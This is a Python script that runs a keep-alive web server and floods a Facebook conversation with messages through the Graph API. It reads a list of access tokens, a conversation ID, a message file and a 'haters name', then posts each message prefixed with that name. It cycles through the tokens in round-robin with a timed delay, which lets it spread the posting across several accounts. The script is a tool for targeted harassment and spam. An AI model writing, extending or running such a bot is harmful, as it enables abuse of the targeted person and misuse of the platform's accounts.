import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading

# HTTP Server to keep Render app alive
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"CREATED BY MR PREM PROJECT")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# Main message-sending logic
def send_messages():
    try:
        # Validate the password
        with open('password.txt', 'r') as file:
            correct_password = file.read().strip()

        entered_password = correct_password  # Replace with user input for real scenarios
        if entered_password != correct_password:
            print('[-] WRONG PASSWORD TRY AGAIN')
            sys.exit()

        # Read tokens, conversation ID, messages, etc.
        with open('token.txt', 'r') as file:
            tokens = [token.strip() for token in file.readlines() if token.strip()]

        if not tokens:
            raise ValueError("Token file is empty.")

        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()

        with open('file.txt', 'r') as file:
            text_file_path = file.read().strip()

        with open(text_file_path, 'r') as file:
            messages = [message.strip() for message in file.readlines() if message.strip()]

        if not messages:
            raise ValueError("Message file is empty.")

        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()

        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'referer': 'www.google.com'
        }

        # Function to clear console
        def cls():
            if system() == 'Linux':
                os.system('clear')
            elif system() == 'Windows':
                os.system('cls')

        cls()

        # Main loop: Send messages using tokens in a round-robin manner
        token_index = 0
        for idx, message in enumerate(messages):
            token = tokens[token_index]
            token_index = (token_index + 1) % len(tokens)  # Move to the next token
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            payload = {'access_token': token, 'message': f"{haters_name} {message}"}

            try:
                response = requests.post(url, json=payload, headers=headers)

                if response.ok:
                    print(f"[+] Message {idx + 1} sent: {haters_name} {message}")
                else:
                    print(f"[x] Failed to send message {idx + 1}: {response.status_code} {response.text}")

                time.sleep(speed)  # Delay between messages
            except requests.RequestException as e:
                print(f"[!] Error sending message {idx + 1}: {e}")
                break

        print("\n[+] All messages sent. Exiting...\n")

    except FileNotFoundError as e:
        print(f"[!] File not found: {e}")
    except ValueError as e:
        print(f"[!] Value Error: {e}")
    except Exception as e:
        print(f"[!] Unexpected Error: {e}")

# Main entry point
def main():
    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server, daemon=True)
    server_thread.start()

    # Start the message-sending logic
    send_messages()

if __name__ == '__main__':
    main()
